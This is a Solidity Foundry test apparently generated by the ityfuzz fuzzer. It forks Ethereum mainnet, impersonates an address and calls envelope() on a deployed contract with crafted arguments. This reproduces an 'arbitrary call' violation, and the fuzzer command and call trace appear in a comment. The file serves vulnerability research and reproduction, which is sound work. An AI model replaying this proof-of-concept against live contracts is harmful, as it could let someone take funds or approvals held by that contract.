// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x6B175474E89094C44Da98b954EedeAC495271d0F,0x9008D19f58AAbD9eD0D60971565AA8510560ab41,0xcD07a7695E3372aCD2B2077557DE93e667B92bd8 -c eth --onchain-block-number 16574049 -f -i -p --onchain-etherscan-api-key $ETH_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Arbitrary call from "0xcd07a7695e3372acd2b2077557de93e667b92bd8" to 0xcd07a7695e3372acd2b2077557de93e667b92bd8
================ Trace ================
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   ├─[1] 0xcD07a7695E3372aCD2B2077557DE93e667B92bd8.envelope{value: 1088}(((0xcD07a7695E3372aCD2B2077557DE93e667B92bd8, 6858, 0xcecedd0e7a0e0e0df1f50e0edaf10e0e00150d1d)), 0xe1A425f1AC34A8a441566f93c82dD730639c8510, (), (6105, 6105, 6105, 6105), (0), 21227)
   │  │  └─ ← ()


 */

contract C6B17 is Test {
    function setUp() public {
        vm.createSelectFork("eth", 16574049);
    }

    function test() public {

        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        vm.deal(0xe1A425f1AC34A8a441566f93c82dD730639c8510, 1088);
        0xcD07a7695E3372aCD2B2077557DE93e667B92bd8.call{value: 1088}(abi.encodeWithSignature(
            "envelope((address,uint256,bytes)[],address,address[],uint256[],int256[],uint256)",[[0xcD07a7695E3372aCD2B2077557DE93e667B92bd8, 6858, 0xcecedd0e7a0e0e0df1f50e0edaf10e0e00150d1d]], 0xe1A425f1AC34A8a441566f93c82dD730639c8510, [], [6105, 6105, 6105, 6105], [0], 21227
        )); 
    }

    // Stepping with return
    receive() external payable {}
}

